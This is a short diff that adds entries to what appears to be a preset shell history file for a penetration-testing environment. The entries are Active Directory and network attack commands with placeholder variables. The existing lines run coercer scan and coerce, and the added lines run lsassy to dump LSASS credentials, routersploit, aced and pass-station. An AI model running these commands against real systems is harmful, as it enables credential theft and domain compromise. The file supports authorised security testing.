@@ -86,3 +86,8 @@
 : 171000085:0;arsenal
 : 171000086:0;coercer scan -t $TARGET -u $USER -p $PASSWORD -d $DOMAIN
 : 171000087:0;coercer coerce -l $LOCAL_IP -t $TARGET -u $USER -p $PASSWORD -d $DOMAIN
+: 171000088:0;lsassy -d $DOMAIN -u $USER -p $PASSWORD $TARGET
+: 171000089:0;username_generator -w $NAMESFILE
+: 171000090:0;routersploit
+: 171000091:0;aced $DOMAIN/$USER:$PASSWORD@$DC_IP
+: 171000092:0;pass-station search $PRODUCT
